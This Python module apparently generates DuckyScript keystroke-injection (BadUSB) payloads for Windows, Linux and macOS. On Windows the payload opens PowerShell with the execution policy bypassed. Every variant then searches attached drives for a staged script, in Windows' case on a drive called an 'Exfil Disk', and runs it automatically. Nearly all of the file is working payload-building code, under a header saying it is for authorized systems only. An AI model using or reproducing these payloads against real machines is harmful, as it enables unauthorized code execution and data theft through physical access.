from __future__ import annotations

HEADER = """REM CK42X Payload Lab Architect
REM AUTHORIZED SYSTEMS ONLY
"""


def _ps_single(value: str) -> str:
    """Escape text embedded in a PowerShell single-quoted string."""
    return value.replace("'", "''")


def _chunk_string_line(ps: str, max_len: int = 200) -> list[str]:
    """Split a PowerShell one-liner into STRING lines without breaking mid-token."""
    if len(ps) <= max_len:
        return [f"STRING {ps}"]
    parts: list[str] = []
    rest = ps
    while rest:
        if len(rest) <= max_len:
            parts.append(f"STRING {rest}")
            break
        cut = rest.rfind(";", 0, max_len + 1)
        if cut <= 0:
            cut = max_len
        else:
            cut += 1
        parts.append(f"STRING {rest[:cut]}")
        rest = rest[cut:]
    return parts


def windows_handoff(*, script_name: str, title: str, goal: str, activity: str) -> str:
    f = script_name.replace(".ps1", ".ps1")
    safe_title = _ps_single(title[:40])
    safe_goal = _ps_single(goal)
    safe_activity = _ps_single(activity)
    lines = [
        HEADER,
        "REM STORAGE-HANDOFF",
        f"REM Mission: {title}",
        "REM Runs host agent from PAYLOADBAY Exfil Disk scripts/",
        "",
        "DEFAULT_DELAY 100",
        "DELAY 2000",
        "",
        "GUI r",
        "DELAY 600",
        "STRING powershell -NoProfile -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1500",
        "STRING [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "ENTER",
        f"STRING $Host.UI.RawUI.WindowTitle='CK42X PL-ARCH - {safe_title}'",
        "ENTER",
        f"STRING $f='{f}';$e=(Get-Date).AddMinutes(6);$b=$null;$sec=0",
        "ENTER",
        (
            "STRING Write-Host ''; Write-Host ' CK42X Payload Lab Architect' -ForegroundColor Cyan; "
            f"Write-Host ' Waiting for PAYLOADBAY scripts/{f}...' -ForegroundColor Yellow; Write-Host ''"
        ),
        "ENTER",
    ]
    poll = (
        "while((Get-Date)-lt $e -and !$b){foreach($d in (Get-CimInstance Win32_LogicalDisk|"
        "?{$_.DriveType-eq 2})){$p=$d.DeviceID+'\\scripts\\'+$f;if(Test-Path $p){$b=$d.DeviceID+'\\';break}};"
        "if(!$b){$sec+=2;$pct=[math]::Min(99,[int](($sec/360)*100));"
        f"Write-Progress -Activity '{safe_activity}' -Status ('Scanning '+$sec+'s') -PercentComplete $pct;"
        "Start-Sleep 2}};Write-Progress -Activity 'CK42X Handoff' -Completed"
    )
    lines.extend(_chunk_string_line(poll))
    lines.append("ENTER")
    run = (
        f"if($b){{"
        f"$s=$b+'scripts\\'+$f;"
        f"Write-Host ('[OK] PAYLOADBAY: '+$b) -ForegroundColor Green;"
        f"Write-Host ('[>>] '+$s) -ForegroundColor Yellow;Write-Host '';"
        f"try{{$env:PAYLOADBAY_MISSION_GOAL='{safe_goal}';"
        f"& $s"
        f"}}catch{{"
        f"Write-Host $_.Exception.Message -ForegroundColor Red;"
        f"Read-Host 'Error - Press Enter'"
        f"}}"
        f"}}else{{"
        f"Write-Host '[!!] PAYLOADBAY not found.' -ForegroundColor Red;"
        f"Read-Host 'Press Enter'"
        f"}}"
    )
    lines.extend(_chunk_string_line(run))
    lines.append("ENTER")
    return "\n".join(lines) + "\n"


def windows_direct(script_name: str, title: str) -> str:
    """Minimal launcher: copies script name hint; operator stages agent on disk separately."""
    safe_title = _ps_single(title)
    return (
        HEADER
        + f"REM Mission: {title}\n"
        + "DEFAULT_DELAY 100\nDELAY 2000\nGUI r\nDELAY 600\n"
        + "STRING powershell -NoProfile -ExecutionPolicy Bypass\nENTER\nDELAY 1500\n"
        + f"STRING Write-Host 'CK42X: run agent from mission bundle ({_ps_single(script_name)})' -ForegroundColor Cyan\n"
        + "ENTER\n"
    )


def linux_handoff(script_name: str, title: str) -> str:
    f = script_name
    return (
        HEADER
        + "REM STORAGE-HANDOFF\n"
        + f"REM Mission: {title}\n"
        + "DEFAULT_DELAY 100\nDELAY 2000\n"
        + "GUI h\nDELAY 400\nSTRING xterm -hold -e bash\nENTER\nDELAY 1200\n"
        + f"STRING f={f};e=$((SECONDS+360));r=;while [ $SECONDS -lt $e ] && [ -z \"$r\" ];do "
        + "for v in /media/* /mnt/*;do [ -f \"$v/scripts/$f\" ] && r=\"$v/scripts/$f\" && break;done;"
        + "[ -z \"$r\" ] && sleep 2;done;[ -n \"$r\" ] && bash \"$r\"\nENTER\n"
    )


def macos_handoff(script_name: str, title: str) -> str:
    f = script_name
    return (
        HEADER
        + "REM STORAGE-HANDOFF\n"
        + f"REM Mission: {title}\n"
        + "DEFAULT_DELAY 100\nDELAY 2000\n"
        + "GUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\n"
        + f"STRING f={f};e=$((SECONDS+360));r=;while [ $SECONDS -lt $e ] && [ -z \"$r\" ];do "
        + "for v in /Volumes/*;do [ -f \"$v/scripts/$f\" ] && r=\"$v/scripts/$f\" && break;done;"
        + "[ -z \"$r\" ] && sleep 2;done;[ -n \"$r\" ] && bash \"$r\"\nENTER\n"
    )
